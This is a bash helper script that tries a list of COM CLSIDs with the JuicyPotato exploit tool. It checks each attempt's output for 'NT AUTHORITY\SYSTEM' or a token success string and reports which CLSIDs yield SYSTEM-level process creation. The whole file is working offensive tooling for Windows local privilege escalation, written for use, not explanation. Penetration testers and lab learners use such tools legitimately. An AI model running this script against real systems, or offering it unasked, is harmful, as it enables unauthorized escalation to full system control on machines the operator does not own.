#!/bin/bash
# Find working CLSIDs for JuicyPotato
# Usage: ./find-working-clsid.sh -jp "JuicyPotato.exe" -p 1337

JP_PATH="JuicyPotato.exe"
PORT=1337

# Common CLSIDs to test
CLSIDS=(
    "{4991d34b-80a1-4291-83b6-3328366b9097}"
    "{6b3b8f25-589c-4995-b1e8-ea4534176341}"
    "{a47979d2-c419-11d0-8c16-00c04fd918b4}"
    "{61850401-605d-4739-8135-f3c44bb64453}"
    "{d6983230-2152-11d9-a662-0800200c9a66}"
    "{0f217a59-11d8-4c5f-8a4d-756f7b4704ee}"
    "{1c233d01-2b11-11d0-b910-00a0c9223196}"
    "{2048105b-7cc7-4883-bc73-65de97f134b7}"
    "{2593f8b9-4eaf-4570-b1b3-97c310a94d83}"
    "{2e353070-3be7-11cf-810c-00aa003f0f08}"
)

echo "[*] Testing CLSIDs with JuicyPotato"
echo "    Port: $PORT"
echo "    CLSIDs to test: ${#CLSIDS[@]}"
echo ""

WORKING=()

for CLSID in "${CLSIDS[@]}"; do
    echo "[*] Testing CLSID: $CLSID"
    
    OUTPUT=$($JP_PATH -t * -p "C:\Windows\System32\cmd.exe" -a "/c exit" -l $PORT -c $CLSID 2>&1)
    
    if echo "$OUTPUT" | grep -q "NT AUTHORITY\\SYSTEM\|CreateProcessWithTokenW OK"; then
        echo "[+] WORKING: $CLSID"
        WORKING+=("$CLSID")
    else
        echo "[-] Failed: $CLSID"
    fi
done

echo ""
echo "[*] Results:"
if [ ${#WORKING[@]} -gt 0 ]; then
    echo "[+] Found ${#WORKING[@]} working CLSID(s):"
    for CLSID in "${WORKING[@]}"; do
        echo "    $CLSID"
    done
else
    echo "[-] No working CLSIDs found"
    echo "    Try downloading the full CLSID list from https://ohpe.it/juicy-potato/CLSID/"
fi
